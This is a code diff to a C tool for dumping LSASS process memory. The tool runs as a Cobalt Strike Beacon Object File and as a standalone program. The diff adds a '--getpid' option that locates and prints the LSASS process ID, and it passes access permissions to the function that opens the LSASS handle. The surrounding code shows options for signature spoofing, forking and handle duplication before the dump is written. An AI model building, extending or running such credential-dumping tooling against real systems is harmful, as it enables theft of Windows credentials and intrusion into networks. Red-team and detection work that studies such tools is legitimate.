@@ -859,6 +859,7 @@ void go(char* args, int length)
     ULONG32 Signature;
     SHORT   Version;
     SHORT   ImplementationVersion;
+    BOOL    get_pid_and_leave;
 
     BeaconDataParse(&parser, args, length);
     pid = BeaconDataInt(&parser);
@@ -867,6 +868,26 @@ void go(char* args, int length)
     use_valid_sig = (BOOL)BeaconDataInt(&parser);
     fork = (BOOL)BeaconDataInt(&parser);
     dup = (BOOL)BeaconDataInt(&parser);
+    get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
+
+    if (get_pid_and_leave)
+    {
+        DWORD pid = get_lsass_pid();
+        if (!pid)
+        {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "Failed to find the PID of LSASS.\n"
+            );
+            return;
+        }
+        BeaconPrintf(
+            CALLBACK_OUTPUT,
+            "LSASS PID: %ld\n",
+            pid
+        );
+        return;
+    }
 
     // set the signature
     if (use_valid_sig)
@@ -920,7 +941,9 @@ void go(char* args, int length)
     }
     else
     {
-        hProcess = find_lsass();
+        hProcess = find_lsass(
+            LSASS_PERMISSIONS
+        );
     }
     if (!hProcess)
         return;
@@ -1014,6 +1037,7 @@ int main(int argc, char* argv[])
     SHORT   ImplementationVersion;
     BOOL    success;
     BOOL    use_valid_sig = FALSE;
+    BOOL    get_pid_and_leave = FALSE;
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1027,7 +1051,11 @@ int main(int argc, char* argv[])
 
     for (int i = 1; i < argc; ++i)
     {
-        if (!strncmp(argv[i], "-v", 3) ||
+        if (!strncmp(argv[i], "--getpid", 9))
+        {
+            get_pid_and_leave = TRUE;
+        }
+        else if (!strncmp(argv[i], "-v", 3) ||
             !strncmp(argv[i], "--valid", 8))
         {
             use_valid_sig = TRUE;
@@ -1075,6 +1103,18 @@ int main(int argc, char* argv[])
             printf("invalid argument: %s\n", argv[i]);
             return -1;
         }
+    }
+
+    if (get_pid_and_leave)
+    {
+        DWORD pid = get_lsass_pid();
+        if (!pid)
+        {
+            printf("Failed to find the PID of LSASS.\n");
+            return -1;
+        }
+        printf("LSASS PID: %ld\n", pid);
+        return 0;
     }
 
     if (!dump_name)
@@ -1153,7 +1193,9 @@ int main(int argc, char* argv[])
     }
     else
     {
-        hProcess = find_lsass();
+        hProcess = find_lsass(
+            LSASS_PERMISSIONS
+        );
     }
     if (!hProcess)
         return -1;
